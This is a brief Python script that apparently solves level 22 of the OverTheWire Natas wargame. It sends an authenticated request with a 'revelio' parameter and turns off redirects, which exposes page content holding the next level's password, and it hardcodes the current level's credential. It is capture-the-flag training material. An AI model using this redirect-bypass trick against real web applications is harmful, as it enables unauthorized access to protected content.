import requests

username = 'natas22'
password = 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'

url = "http://%s.natas.labs.overthewire.org" % username

params = {
    'revelio': ''
}

r = requests.get(url, params=params, auth=(username,password), allow_redirects=False)
print(r.text)